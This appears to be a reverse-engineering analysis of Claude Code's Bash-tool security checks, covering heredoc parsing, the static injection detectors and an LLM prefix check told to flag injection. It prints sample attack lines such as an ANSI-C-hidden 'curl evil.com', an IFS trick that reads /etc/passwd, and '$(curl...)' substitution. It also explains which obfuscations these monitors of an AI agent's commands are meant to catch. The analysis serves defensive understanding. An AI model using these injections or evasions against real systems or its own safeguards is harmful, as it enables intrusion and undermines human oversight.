# Heredoc Injection Prevention & Shell Security (Claude Code 2.1.76)

> Analysis of heredoc injection prevention, shell command parsing for security,
> injection detection, command sanitization pipeline, Bash tool security model integration,
> and edge cases.

---

## Related Symbols

> Symbol mappings:
> - [symbol_index_core_execution.md](../00_overview/symbol_index_core_execution.md) - Core execution
> - [symbol_index_core_features.md](../00_overview/symbol_index_core_features.md) - Core features
> - [symbol_index_infra_platform.md](../00_overview/symbol_index_infra_platform.md) - Platform infra
> - [symbol_index_infra_integration.md](../00_overview/symbol_index_infra_integration.md) - Integrations

Key functions in this document:
- `extractHeredocs` (ca) - Identifies and extracts heredoc blocks from a command, replacing them with placeholders
- `parseShellCommand` (bW6) - Tokenizes a shell command while preserving heredocs
- `extractSubcommands` (EO) - Splits a compound command into individual subcommands
- `bashPreFlightCheck` (nGq) - LLM-based command prefix extraction for permission matching
- `runSecurityChecksSync` (Rp6) - Master security validation pipeline (sync, no tree-sitter)
- `runSecurityChecksAsync` (O01) - Master security validation pipeline (async, with tree-sitter)
- `checkEmptyCommand` (uY4) - Passes empty commands as safe
- `checkIncompleteCommand` (mY4) - Detects fragments (starts with tab, flag, or operator)
- `checkHeredocInSubstitution` (gY4) - Validates `$( cat <<DELIM ... )` patterns
- `isQuotedHeredocInSubstitution` (Hg9) - Detailed check for heredoc-in-$() safety
- `checkGitCommitMessage` (FY4) - Special handling for git commit -m with substitution detection
- `checkJqCommand` (pY4) - Detects jq `system()` and dangerous file-reading flags
- `checkDangerousPatterns` (dY4) - Detects backticks, `$()`, `${}`, `<()`, `>()` and redirections
- `checkObfuscatedFlags` (rY4) - Detects ANSI-C quoting, locale quoting, and quoted flag names
- `checkShellMetacharacters` (QY4) - Detects `;`, `|`, `&` in quoted arguments
- `checkDangerousVariables` (UY4) - Detects variables in redirection/pipe contexts
- `checkNewlines` (w01) - Detects newlines that could separate multiple commands
- `checkIFSInjection` (lY4) - Detects `$IFS` or `${...IFS` variable manipulation
- `checkProcEnviron` (iY4) - Detects `/proc/*/environ` access
- `checkMalformedTokenInjection` (nY4) - Detects ambiguous syntax with command separators
- `checkBackslashEscapedWhitespace` (oY4) - Detects `\` before space/tab
- `checkBraceExpansion` (sY4) - Detects `{a,b}` and `{1..3}` patterns
- `checkUnicodeWhitespace` (tY4) - Detects non-ASCII whitespace characters
- `checkMidWordHash` (eY4) - Detects `#` in middle of word
- `checkZshDangerousCommands` (Kz4) - Detects zmodload, emulate, sysopen, etc.
- `checkBackslashEscapedOperators` (aY4) - Detects `\;`, `\|`, `\&`, `\<`, `\>`
- `checkCommentQuoteDesync` (Az4) - Detects quote inside `#` comment
- `checkQuotedNewline` (qz4) - Detects quoted newline + `#` pattern
- `stripQuotes` (bY4) - Removes quotes from command content for deep inspection
- `stripRedirections` (xY4) - Removes safe redirect patterns before analysis
- `SECURITY_CHECK_IDS` (w3) - Enum of all security check identifiers for telemetry
- `DANGEROUS_PATTERNS` (wg9) - Array of regex patterns for dangerous shell constructs
- `HEREDOC_IN_SUBSTITUTION_PATTERN` (lV8) - Regex: `/\$\(.*<</`
- `ZSH_DANGEROUS_COMMANDS` (Og9) - Set of Zsh-specific dangerous commands
- `SHELL_OPERATORS` (Jg9) - Set of shell operator characters
- `UNICODE_WHITESPACE_REGEX` (Dg9) - Regex for non-ASCII whitespace
- `CONTROL_CHARACTERS_REGEX` (Yz4) - Regex for non-printable control chars

> **Note:** All symbol mappings have been verified against the actual source code in chunks.91.mjs,
> chunks.171.mjs, chunks.172.mjs, and chunks.56.mjs.

---

## Overview

Claude Code's Bash tool is one of its most powerful and most dangerous capabilities. The LLM
generates arbitrary shell commands to execute on the user's machine. The security system must:

1. **Detect injection attacks** where the LLM (intentionally or via prompt injection) tries to
   hide malicious commands inside seemingly safe ones
2. **Parse heredocs safely** without confusing heredoc content with command syntax
3. **Extract command prefixes** for permission matching (e.g., "git commit" is allowed, "curl" is not)
4. **Handle edge cases** in shell quoting, escaping, and multi-line commands

The system uses a **two-phase approach**: fast local checks (regex + tokenizer) and a
**slow LLM-based check** (prefix extraction). Only commands that pass local checks and have a
recognized prefix are auto-approved.

---

## Security Pipeline Architecture

```
Command from LLM
       │
       ▼
┌──────────────────────────────┐
│ Phase 1: Static Security     │
│ Checks (Rp6/O01)             │
│                              │
│ ┌──────────────────────────┐ │
│ │ Early Allow Checks       │ │
│ │ 1. Empty command (uY4)   │ │
│ │ 2. Incomplete fragment   │ │
│ │    (mY4)                 │ │
│ │ 3. Heredoc in $() (gY4)  │ │
│ │ 4. Git commit (FY4)      │ │
│ └──────────┬───────────────┘ │
│            │ passthrough     │
│ ┌──────────▼───────────────┐ │
│ │ Security Violation Checks│ │
│ │ 6-14. Original checks    │ │
│ │ 15. Backslash whitespace │ │
│ │ 16. Brace expansion      │ │
│ │ 17. Control characters   │ │
│ │ 18. Unicode whitespace   │ │
│ │ 19. Mid-word hash        │ │
│ │ 20. Zsh dangerous cmds   │ │
│ │ 21. Backslash operators  │ │
│ │ 22. Comment quote desync │ │
│ │ 23. Quoted newline       │ │
│ └──────────┬───────────────┘ │
└────────────┼────────────────┘
             │
             ▼ "passthrough" = safe, "ask" = needs user approval
┌──────────────────────────────┐
│ Phase 2: LLM Prefix Check    │
│ (nGq / bashPreFlightCheck)   │
│                              │
│ Extracts command prefix:      │
│ "git commit" → allowed        │
│ "curl" → ask user             │
│ "command_injection_detected"  │
│ → always ask user             │
└──────────────────────────────┘
```

---

## Deep Analysis: Heredoc Extraction

### The Problem

Heredocs are multi-line string literals in bash:
```bash
cat <<EOF
This is content that should NOT be parsed as commands
rm -rf / # This is just text, not a command
EOF
```

Without heredoc awareness, the security system would:
- Tokenize `rm -rf /` as a dangerous command
- Flag `#` as a comment injection
- Misparse the multi-line structure

### extractHeredocs (ca) — Complete Source Restoration

**What it does:** Identifies all heredoc blocks in a command, replaces them with unique placeholders, and returns both the processed command and a map of placeholder-to-original-content.

**Location:** chunks.56.mjs:945-1160

```javascript
// ============================================
// extractHeredocs - Extract heredoc blocks and replace with placeholders
// Location: chunks.56.mjs:945-1160
// ============================================

// ORIGINAL (for source lookup):
function ca(A, q) {
    let K = new Map;
    if (!A.includes("<<")) return { processedCommand: A, heredocs: K };
    if (/\$['"]/.test(A)) return { processedCommand: A, heredocs: K };
    let Y = A.indexOf("<<");
    if (Y > 0 && A.slice(0, Y).includes("`")) return { processedCommand: A, heredocs: K };
    if (Y > 0) {
        let f = A.slice(0, Y), v = (f.match(/\(\(/g) || []).length,
            N = (f.match(/\)\)/g) || []).length;
        if (v > N) return { processedCommand: A, heredocs: K }
    }
    let z = new RegExp(Lu3.source, "g"), _ = [], w = [], O, $ = 0,
        H = !1, j = !1, J = !1, M = !1, D = 0,
        X = (f) => {
            for (let v = $; v < f; v++) {
                let N = A[v];
                if (N === "\n") J = !1;
                if (H) { if (N === "'") H = !1; continue }
                if (j) {
                    if (M) { M = !1; continue }
                    if (N === "\\") { M = !0; continue }
                    if (N === '"') j = !1; continue
                }
                if (N === "\\") { D++; continue }
                let V = D % 2 === 1;
                if (D = 0, V) continue;
                if (N === "'") H = !0;
                else if (N === '"') j = !0;
                else if (!J && N === "#") J = !0
            }
            $ = f
        };
    while ((O = z.exec(A)) !== null) {
        let f = O.index;
        if (X(f), H || j) continue;
        if (J) continue;
        if (D % 2 === 1) continue;
        let v = !1;
        for (let z6 of w)
            if (f > z6.contentStartIndex && f < z6.contentEndIndex) { v = !0; break }
        if (v) continue;
        // ... parse delimiter, find content boundaries, record match ...
        let N = O[0], V = O[1] === "-", L = O[3] || O[4],
            h = f + N.length, R = O[2];
        if (R && A[h - 1] !== R) continue;
        let u = N.includes("\\"), I = !!R || u;
        // ... find newline after operator, find closing delimiter ...
        _.push({
            fullText: X6,
            delimiter: L,
            operatorStartIndex: f,
            operatorEndIndex: h,
            contentStartIndex: p,
            contentEndIndex: H6
        })
    }
    if (_.length === 0) return { processedCommand: A, heredocs: K };
    let P = _.filter((f, v, N) => {
        for (let V of N) {
            if (f === V) continue;
            if (f.operatorStartIndex > V.contentStartIndex && f.operatorStartIndex < V.contentEndIndex) return !1
        }
        return !0
    });
    P.sort((f, v) => v.contentEndIndex - f.contentEndIndex);
    let Z = yu3(), G = A;
    return P.forEach((f, v) => {
        let N = P.length - 1 - v, V = `__HEREDOC_${N}_${Z}__`;
        K.set(V, f), G = G.slice(0, f.operatorStartIndex) + V + G.slice(f.operatorEndIndex, f.contentStartIndex) + G.slice(f.contentEndIndex)
    }), { processedCommand: G, heredocs: K }
}

// Mapping: ca→extractHeredocs, A→command, q→options, K→heredocMap,
//          H→inSingleQuote, j→inDoubleQuote, J→inComment, M→escapedInDouble,
//          D→backslashCount, $→lastProcessedIndex, Lu3→HEREDOC_REGEX, yu3→generateRandomHex
```

### Quote/Comment Context Tracking State Machine

The heredoc extraction uses a multi-state tracking system to determine whether a `<<` operator is inside a quoted string or comment. This is critical because:

1. `echo "hello << world"` — The `<<` inside double quotes is NOT a heredoc
2. `echo 'hello << world'` — The `<<` inside single quotes is NOT a heredoc
3. `echo hello # << not a heredoc` — The `<<` inside a comment is NOT a heredoc
4. `echo hello \\<< world` — The escaped `<<` is NOT a heredoc

**State Machine Diagram:**

```
                    ┌─────────────────────────────────────┐
                    │           DEFAULT STATE              │
                    │  (outside quotes and comments)       │
                    └──────────────┬──────────────────────┘
                                   │
        ┌──────────────────────────┼──────────────────────────┐
        │                          │                          │
        │ ' (single quote)         │ " (double quote)         │ # (hash)
        │                          │                          │
        ▼                          ▼                          ▼
┌───────────────┐        ┌───────────────┐        ┌───────────────┐
│ SINGLE_QUOTE  │        │ DOUBLE_QUOTE  │        │   COMMENT     │
│    State      │        │    State      │        │    State      │
│               │        │               │        │               │
│ No escapes    │        │ \ = escape    │        │ Ignore all    │
│ recognized    │        │ next char     │        │ until \n      │
│               │        │               │        │               │
│ ' exits       │        │ " exits       │        │ \n exits      │
└───────────────┘        └───────────────┘        └───────────────┘

Also tracked: backslash count outside quotes
  - Odd count: next character is escaped
  - Even count: not escaped
```

**State Variables:**

| Variable | Name | Purpose |
|----------|------|---------|
| `H` | inSingleQuote | True when inside `'...'` |
| `j` | inDoubleQuote | True when inside `"..."` |
| `J` | inComment | True when after `#` outside quotes |
| `M` | escapedInDouble | True after `\` inside double quotes |
| `D` | backslashCount | Count of consecutive backslashes outside quotes |
| `$` | lastProcessedIndex | Optimizes state machine to not re-scan |

**Key insight:** Single quotes in bash have NO escape sequences. A backslash inside `'...'` is a literal backslash. The state machine correctly handles this by NOT checking for escapes when `H` (inSingleQuote) is true.

### Early Exit Conditions

The function has several early exit conditions to avoid complex parsing when heredocs are impossible or unsafe to extract:

```javascript
// No heredoc operators
if (!A.includes("<<")) return { processedCommand: A, heredocs: K };

// ANSI-C or locale quoting present - complex parsing, skip
if (/\$['"]/.test(A)) return { processedCommand: A, heredocs: K };

// Backticks before << - might be command substitution context
if (Y > 0 && A.slice(0, Y).includes("`")) return { processedCommand: A, heredocs: K };

// Unbalanced arithmetic expansion before << - parsing confusion
if (v > N) return { processedCommand: A, heredocs: K }
```

### Heredoc Regex Pattern

```javascript
// Lu3 - Heredoc operator regex
// Location: chunks.56.mjs:1181
Lu3 = /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/

// Explanation:
// (?<!<)        - Not preceded by < (avoid matching <<<)
// <<            - The heredoc operator
// (?!<)         - Not followed by < (avoid matching <<<)
// (-)?          - Optional tab-stripping flag
// [ \t]*        - Optional whitespace
// (?:(['"])(\\?\w+)\2|\\?(\w+))  - Delimiter:
//   (['"])(\\?\w+)\2            - Quoted delimiter: 'EOF' or "EOF"
//   |\\?(\w+)                   - Unquoted or escaped: EOF or \EOF
```

### Delimiter Matching

For each potential heredoc, the algorithm:

1. **Finds the content start**: The first newline after the operator
2. **Searches for closing delimiter**: Line-by-line comparison
3. **Handles tab-stripping**: If `<<-` was used, strip leading tabs from content lines before comparing

```javascript
// Tab-stripping comparison
if (V) {  // V = isTabStripping
    if (N6.replace(/^\t*/, "") === L) { r = z6; break }
} else {
    if (N6 === L) { r = z6; break }
}
```

### Nesting Detection

The algorithm correctly handles heredoc operators that appear inside another heredoc's content:

```javascript
// Filter: remove heredoc operators that appear inside another heredoc's content
let P = _.filter((f, v, N) => {
    for (let V of N) {
        if (f === V) continue;
        if (f.operatorStartIndex > V.contentStartIndex && f.operatorStartIndex < V.contentEndIndex) return !1
    }
    return !0
});
```

**Example:**
```bash
cat <<OUTER
This has <<INSIDE which is just text
OUTER
```
The `<<INSIDE` is inside `OUTER`'s content (between contentStartIndex and contentEndIndex), so it's filtered out.

### Placeholder Generation

```javascript
// generateRandomHex (yu3) - Location: chunks.56.mjs:941
function yu3() {
    return Vu3(8).toString("hex")  // 8 random bytes → 16 hex chars
}

// Placeholder format: __HEREDOC_N_HEXADECIMAL__
// Example: __HEREDOC_0_a3f4b2c5d6e7f8a9__
```

**Why this format:**
1. Double underscores make collision with actual content unlikely
2. Index allows reverse-mapping during restoration
3. Random hex suffix prevents collision if command literally contains `__HEREDOC_0__`

### Restoration

```javascript
// restoreHeredocsInList (aw8) - Location: chunks.56.mjs:1169
function aw8(A, q) {
    if (q.size === 0) return A;
    return A.map((K) => Ru3(K, q))
}

// restoreHeredocsInString (Ru3) - Location: chunks.56.mjs:1163
function Ru3(A, q) {
    let K = A;
    for (let [Y, z] of q) K = K.replaceAll(Y, z.fullText);
    return K
}

// Mapping: aw8→restoreHeredocsInList, Ru3→restoreHeredocsInString
```

### Security Implications

**Why heredoc extraction matters for security:**

1. **Prevents false positives**: Heredoc content often contains text that looks like commands:
   ```bash
   cat <<EOF
   rm -rf /  # This is documentation, not a command
   git push --force  # Example of dangerous command
   EOF
   ```
   Without extraction, the security pipeline would flag `rm -rf /` and `git push --force`.

2. **Handles quote context correctly**: The state machine ensures we don't extract `<<` from inside strings:
   ```bash
   echo "Please use << for heredocs"
   ```
   The `<<` here is literal text, not a heredoc operator.

3. **Detects heredoc-in-substitution attacks**:
   ```bash
   $(cat <<EOF
   malicious content
   EOF
   )
   ```
   The `checkHeredocInSubstitution` (gY4) check validates these patterns.

4. **Quoted delimiter detection**: Heredocs with quoted delimiters (`<<'EOF'`) prevent variable expansion, making them safer:
   ```bash
   cat <<'EOF'
   $HOME is literal text, not expanded
   EOF
   ```
   The `Hg9` (isQuotedHeredocInSubstitution) helper validates these patterns within `gY4`.

### Edge Cases

| Case | Example | Handling |
|------|---------|----------|
| Heredoc in `$()` | `$(cat <<EOF\n...\nEOF)` | Early exit if backticks present, otherwise extracted |
| Unbalanced arithmetic | `((1+2 << 3)` | Early exit if `((` count > `))` count |
| Escaped `<<` | `echo \\<< not heredoc` | Detected via backslash count, skipped |
| Multiple heredocs | `cat <<A\na\nA <<B\nb\nB` | Both extracted, sorted by position |
| Nested operators | `cat <<X\n<<Y\nX` | Inner `<<Y` filtered as inside X's content |
| Missing delimiter | `cat <<EOF\nno closing` | Skipped (no content end found) |

---

## Deep Analysis: Security Check Pipeline

### runSecurityChecks (zg9)

**What it does:** The master function that orchestrates all security checks on a bash command. Returns either `"passthrough"` (safe), `"allow"` (explicitly safe), or `"ask"` (needs user confirmation).

**How it works:**

1. **Pre-check**: Detect single-quoted backslash bypass patterns (`CY8`)
2. **Extract base command**: The first word of the command (e.g., `git`, `npm`, `cat`)
3. **Strip quotes**: Remove single and double quotes to examine the unquoted content
4. **Build context object**: `{ originalCommand, baseCommand, unquotedContent, fullyUnquotedContent, fullyUnquotedPreStrip }`
5. **Run allow-list checks**: These can short-circuit with "allow" (safe to run)
6. **Run deny-list checks**: These can short-circuit with "ask" (needs user confirmation)
7. **Default**: If no check triggers, return "passthrough" (defer to prefix matching)

```javascript
// ============================================
// runSecurityChecks - Master security validation pipeline
// Location: chunks.91.mjs:1104
// ============================================

// READABLE (for understanding):
async function runSecurityChecks(command) {
    // Pre-check for backslash bypass
    if (hasSingleQuotedBackslashBypass(command))
        return { behavior: "ask", message: "Potential security bypass detected" };

    let baseCommand = command.split(" ")[0] || "";
    let { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars } = stripQuotes(command, baseCommand === "jq");
    let context = {
        originalCommand: command,
        baseCommand,
        unquotedContent: withDoubleQuotes,
        fullyUnquotedContent: stripRedirections(fullyUnquoted),
        fullyUnquotedPreStrip: fullyUnquoted
    };

    // Phase 1: Allow-list checks (can approve the command)
    let allowChecks = [checkEmptyCommand, checkIncompleteCommand, checkHeredocInSubst, checkGitCommit];
    for (let check of allowChecks) {
        let result = check(context);
        if (result.behavior === "allow") return { behavior: "passthrough", message: result.reason };
        if (result.behavior !== "passthrough") return result;
    }

    // Phase 2: Deny-list checks (can require user approval)
    let denyChecks = [checkJqCommand, checkObfuscatedFlags, checkShellMetacharacters,
                      checkDangerousVariables, checkNewlines, checkIFSInjection,
                      checkProcEnviron, checkDangerousPatterns, checkRedirections,
                      checkMalformedTokenInjection];
    for (let check of denyChecks) {
        let result = check(context);
        if (result.behavior === "ask") return result;
    }

    return { behavior: "passthrough", message: "Command passed all security checks" };
}

// Mapping: zg9→runSecurityChecks, CY8→hasSingleQuotedBackslashBypass,
//   uY4→checkEmptyCommand, mY4→checkIncompleteCommand,
//   gY4→checkHeredocInSubstitution, FY4→checkGitCommitMessage,
//   pY4→checkJqCommand, rY4→checkObfuscatedFlags, QY4→checkShellMetacharacters,
//   UY4→checkDangerousVariables, w01→checkNewlines, lY4→checkIFSInjection,
//   iY4→checkProcEnviron, dY4→checkDangerousPatterns, _01→checkRedirections,
//   nY4→checkMalformedTokenInjection
```

**Why two phases (allow then deny)?**

The allow-list runs first because some patterns that LOOK dangerous are actually safe:
- `git commit -m "$(date)"` -- the `$()` is inside a quoted commit message, which is a common and safe pattern
- `cat <<'EOF' ... EOF` -- quoted heredoc delimiters prevent variable expansion, making the content safe
- Empty commands are trivially safe

If an allow check approves the command, the deny checks are skipped entirely. This prevents false positives.

---

## Deep Analysis: Specific Security Checks

### checkHeredocInSubstitution (adY)

**What it does:** Detects the pattern `$( cat <<DELIM ... DELIM )` and allows it when the heredoc delimiter is quoted or escaped (preventing variable expansion inside the heredoc).

**How it works:**
1. Check if the command matches `HEREDOC_IN_SUBSTITUTION_PATTERN` (`/\$\(.*<</`)
2. If yes, check if the heredoc uses `cat` with a quoted delimiter (`'EOF'`) or escaped delimiter (`\EOF`)
3. If the delimiter is quoted/escaped, the content is literal -- safe to allow
4. Otherwise, fall through for further checks

**Why this matters:** The `$(cat <<'EOF' ... EOF)` pattern is Claude Code's own standard way to pass multi-line content to commands (e.g., `git commit -m "$(cat <<'EOF' ... EOF)"`). Without this allow-list entry, Claude Code would flag its own generated commands.

### Quoted Heredoc Handling

> **Note:** In v2.1.76, quoted heredoc validation is integrated into `checkHeredocInSubstitution` (gY4) via the `Hg9` (isQuotedHeredocInSubstitution) helper. There is no separate `checkQuotedHeredoc` function.

The `Hg9` helper validates quoted delimiter patterns:
1. Matches `$(cat <<'DELIM'` or `$(cat <<\DELIM` patterns
2. Verifies proper closing delimiter structure
3. Ensures no dangerous patterns remain after removing safe heredocs

### checkDangerousPatterns (KcY)

> **Correction:** Previously labeled as `edY`, but the actual `edY` function is `checkJqCommand`.
> The dangerous pattern check is `KcY`.

**What it does:** Detects shell metacharacters that enable command substitution, process substitution, or parameter expansion.

**Dangerous patterns detected:**
- `<(` - Process substitution (input)
- `>(` - Process substitution (output)
- `$(` - Command substitution
- `${` - Parameter expansion
- `$[` - Legacy arithmetic expansion
- `~[` - Zsh-style parameter expansion
- `(e:` - Zsh-style glob qualifiers
- `<#` - PowerShell comment syntax

Each pattern has a descriptive message explaining the risk.

### checkObfuscatedFlags ($cY)

**What it does:** Detects attempts to hide flags or dangerous characters inside quoting constructs.

**Patterns detected:**
- `$'...'` - ANSI-C quoting (can hide control characters)
- `$"..."` - Locale quoting
- `$''  -` or `""-` - Empty special quotes followed by a dash (potential flag bypass)
- `'-flag'` or `"-flag"` - Flags wrapped in quotes to evade detection
- Embedded quotes inside flag arguments

**Why this check is critical:** A sophisticated prompt injection might generate:
```bash
git status $'\x0a' curl evil.com   # \x0a = newline
```
The ANSI-C quoting hides a newline character that would make this two separate commands.

### checkIFSInjection (zcY)

**What it does:** Detects manipulation of the `IFS` (Internal Field Separator) variable.

**Why it matters:** Changing `IFS` can alter how bash tokenizes commands:
```bash
IFS=/ && cat$IFS/etc/passwd  # cat becomes "cat" with IFS splitting
```

### checkMalformedTokenInjection (HcY)

**What it does:** Parses the command with the shell tokenizer and checks for ambiguous syntax near command separators (`;`, `&&`, `||`).

**How it works:**
1. Tokenize the command
2. Check if any command separators are present
3. If yes, run `pdY()` to detect tokens that look malformed (could be parser confusion)

---

## Deep Analysis: LLM-Based Prefix Extraction

### bashPreFlightCheck (nGq)

**What it does:** Uses a small, fast LLM to extract the "command prefix" from a bash command for permission matching.

**How it works:**
1. **Quick bypass**: If the command is just `--help`, return it directly (via `X9z` / isSimpleHelpCommand)
2. **Parse subcommands**: Extract individual commands from compound expressions
3. **Call LLM**: Send the command to a fast model with a detailed policy specification
4. **Parse response**: The LLM returns one of:
   - A prefix string (e.g., `"git commit"`, `"grep"`)
   - `"none"` -- command has no meaningful prefix (e.g., `npm test`)
   - `"command_injection_detected"` -- LLM detected injection

**The policy specification** (sent as system prompt) includes:
- Extraction examples showing correct prefix for various commands
- Injection detection examples (backticks, `$()`, comment injection)
- Special cases: env var prefixes (`GOEXPERIMENT=synctest go test`)
- Explicit instruction to return `"command_injection_detected"` for suspicious commands

```javascript
// ============================================
// bashPreFlightCheck - LLM-based command prefix extraction
// Location: chunks.171.mjs:1750 (created via QGq factory)
// ============================================

// READABLE (for understanding):
async function bashPreFlightCheck(command, abortSignal, isNonInteractive) {
    if (isSimpleHelpCommand(command)) return { commandPrefix: command };

    let startTime = Date.now();
    try {
        let response = await callFastModel({
            systemPrompt: [BASH_PREFIX_POLICY_SPEC],
            userPrompt: `Command: ${command}`,
            options: { querySource: "bash_extract_prefix" }
        });

        let prefix = extractTextFromResponse(response);

        if (prefix === "command_injection_detected") {
            trackEvent("tengu_bash_prefix", { error: "command_injection_detected" });
            return { commandPrefix: null };  // Forces user approval
        }
        if (prefix === "none") return { commandPrefix: null };
        if (prefix === "git") return { commandPrefix: null };  // Too broad
        if (!command.startsWith(prefix)) return { commandPrefix: null };
        return { commandPrefix: prefix };
    } catch (err) { throw err; }
}

// Mapping: nGq→bashPreFlightCheck, X9z→isSimpleHelpCommand, QGq→createPrefixExtractor
```

**Why use an LLM for prefix extraction?**

Shell commands are extraordinarily complex to parse statically. Consider:
```bash
GOEXPERIMENT=synctest go test -v ./...
```
The prefix here is `GOEXPERIMENT=synctest go test` (includes the env var assignment). A regex-based extractor would need to handle dozens of special cases. An LLM with examples generalizes better.

**Why "command_injection_detected" as a return value?**

This is a defense-in-depth mechanism. Even if the static security checks miss an injection, the LLM may detect it during prefix extraction. For example:
```bash
git status`ls`      # Backtick injection
git diff $(curl...) # Command substitution in arguments
```

When the LLM returns `"command_injection_detected"`, the system forces user approval regardless of any prefix-based allow rules.

**Trade-off:** The LLM call adds latency (~100-500ms). A 10-second warning timeout alerts the user if the check is unusually slow. The `querySource: "bash_extract_prefix"` tag allows the call to use a fast, small model rather than the main conversation model.

---

## Shell Tokenization with Heredoc Preservation

### parseShellCommand (bW6)

**What it does:** Tokenizes a shell command into individual tokens while safely handling heredocs, escaped characters, and special quoting.

**How it works:**
1. Extract heredocs and replace with placeholders via `ca()` (extractHeredocs)
2. Handle line continuations (`\<newline>`)
3. Replace quotes with sentinel values via `iGq()` (generateSentinels) to prevent the tokenizer from consuming them
4. Tokenize using the external `Fz()` (bash-parser) tokenizer
5. Recombine tokens that were split by newline sentinels
6. Restore original characters (quotes, heredocs)

```javascript
// ============================================
// parseShellCommand - Tokenize with heredoc preservation
// Location: chunks.171.mjs:1139
// ============================================

// READABLE (for understanding):
function parseShellCommand(command) {
    let tokens = [];
    let sentinels = generateSentinels();  // iGq(): Random hex to avoid collisions
    let { processedCommand, heredocs } = extractHeredocs(command);  // ca()

    // Handle line continuations (backslash-newline)
    let normalized = processedCommand.replace(/\\+\n/g, continuation => {
        let backslashCount = continuation.length - 1;
        if (backslashCount % 2 === 1) return "\\".repeat(backslashCount - 1);
        else return continuation;
    });

    // Replace quotes with sentinels so tokenizer doesn't consume them
    let prepared = normalized
        .replaceAll('"', `"${sentinels.DOUBLE_QUOTE}`)
        .replaceAll("'", `'${sentinels.SINGLE_QUOTE}`)
        .replaceAll("\n", `\n${sentinels.NEW_LINE}\n`)
        .replaceAll("\\(", sentinels.ESCAPED_OPEN_PAREN)
        .replaceAll("\\)", sentinels.ESCAPED_CLOSE_PAREN);

    let parsed = shellTokenize(prepared, v => `$${v}`);  // Fz()
    if (!parsed.success) return [command];  // Fallback: return original command

    // Recombine tokens split by newlines, restore sentinels...
    let result = /* recombination and sentinel restoration */;
    return restoreHeredocsInList(result, heredocs);  // aw8()
}

// Mapping: bW6→parseShellCommand, iGq→generateSentinels, ca→extractHeredocs,
//   Fz→shellTokenize, aw8→restoreHeredocsInList
```

**Why sentinel-based quote handling?**

The external shell tokenizer (`pz`) consumes quotes and removes them from tokens. But the security system needs to analyze the command WITH quotes to detect quoting-based attacks. By inserting random sentinels adjacent to quotes, the tokenizer preserves the quote characters as part of the token content, which can be restored later.

**Key insight:** The sentinel values use random hex strings (e.g., `__SINGLE_QUOTE_a3f4b2__`) to avoid collision with any actual command content. This is the same collision-prevention strategy used by the heredoc placeholder system.

---

## Edge Cases and Special Handling

### Git Commit Message Security (sdY)

Git commit messages are a common pattern that looks dangerous:
```bash
git commit -m "Fix bug in $(module)"
```

The `$(module)` inside the commit message COULD be command substitution. The check distinguishes:
- **Single-quoted message**: `git commit -m 'Fix $(module)'` -- safe (no expansion in single quotes)
- **Double-quoted message with `$(`**: Flagged as potentially dangerous (substitution patterns)
- **Message starting with dash**: Flagged (could be interpreted as a flag by git)

### JQ Special Handling

The `jq` command uses `$` for variable references in its filter language. The quote stripping logic has a special `isJq` flag that preserves double quotes in jq commands to prevent false positives from patterns like `$var` in jq filters.

### ANSI-C Quoting Bypass

ANSI-C quoting (`$'...'`) can embed escape sequences:
```bash
git status $'\x0a'curl evil.com  # \x0a = newline = command separator
```

The `checkObfuscatedFlags` check specifically detects `$'...'` patterns and requires user approval.

### Empty Quote Flag Bypass

```bash
git ''--help   # Empty quotes before flag
git ""-version # Same with double quotes
```

These patterns could theoretically bypass prefix matching. The check detects empty quote sequences followed by dashes.

---

## Telemetry Integration

Every security check that triggers emits a telemetry event:

```javascript
c("tengu_bash_security_check_triggered", {
    checkId: kH.OBFUSCATED_FLAGS,  // Numeric check identifier
    subId: 4                        // Sub-identifier for specific pattern
})
```

The `SECURITY_CHECK_IDS` enum (`w3`):
| ID | Check |
|----|-------|
| 1 | `INCOMPLETE_COMMANDS` |
| 2 | `JQ_SYSTEM_FUNCTION` |
| 3 | `JQ_FILE_ARGUMENTS` |
| 4 | `OBFUSCATED_FLAGS` |
| 5 | `SHELL_METACHARACTERS` |
| 6 | `DANGEROUS_VARIABLES` |
| 7 | `NEWLINES` |
| 8 | `DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION` |
| 9 | `DANGEROUS_PATTERNS_INPUT_REDIRECTION` |
| 10 | `DANGEROUS_PATTERNS_OUTPUT_REDIRECTION` |
| 11 | `IFS_INJECTION` |
| 12 | `GIT_COMMIT_SUBSTITUTION` |
| 13 | `PROC_ENVIRON_ACCESS` |
| 14 | `MALFORMED_TOKEN_INJECTION` |
| 15 | `BACKSLASH_ESCAPED_WHITESPACE` |
| 16 | `BRACE_EXPANSION` |
| 17 | `CONTROL_CHARACTERS` |
| 18 | `UNICODE_WHITESPACE` |
| 19 | `MID_WORD_HASH` |
| 20 | `ZSH_DANGEROUS_COMMANDS` |
| 21 | `BACKSLASH_ESCAPED_OPERATORS` |
| 22 | `COMMENT_QUOTE_DESYNC` |
| 23 | `QUOTED_NEWLINE` |

This telemetry allows Anthropic to monitor which security checks fire in practice, helping identify false positive hotspots and potential new attack vectors.

---

## Subcommand Extraction for Compound Commands

### extractSubcommands (AD)

**What it does:** Splits a compound bash command (with pipes, `&&`, `;`, etc.) into individual subcommands for per-subcommand prefix extraction.

**How it works:**
1. Parse the command via `rZ1` (parseShellCommand)
2. Iterate tokens, collecting them into subcommands
3. Remove redirect operators (`>`, `>>`, `>&`) and their targets
4. Remove shell-internal tokens (assignment operators, etc.)
5. Return the list of individual subcommands

**Why per-subcommand analysis?** A compound command like:
```bash
npm test && git push
```
Has prefix `npm test` for the first part and `git push` for the second. Each subcommand needs its own prefix extraction and permission check.

---

## Summary of Design Decisions

| Decision | Rationale |
|----------|-----------|
| Two-phase pipeline (static + LLM) | Fast local checks for common cases; LLM for complex parsing |
| Heredoc placeholder extraction | Prevents heredoc content from triggering false positives |
| Random hex in placeholders | Prevents collision with actual command content |
| Allow-list before deny-list | Common safe patterns (heredocs, git commit) bypass expensive checks |
| LLM prefix extraction | Shell syntax too complex for pure regex; LLM generalizes better |
| "command_injection_detected" | Defense-in-depth; LLM catch for attacks that pass static checks |
| Per-check telemetry | Monitor false positive rates and discover new attack patterns |
| Sentinel-based quote preservation | Tokenizer transparency; security system sees original quoting |
| ANSI-C quoting detection | Prevents escape-sequence-based command injection |
| IFS injection detection | Prevents field-separator manipulation attacks |
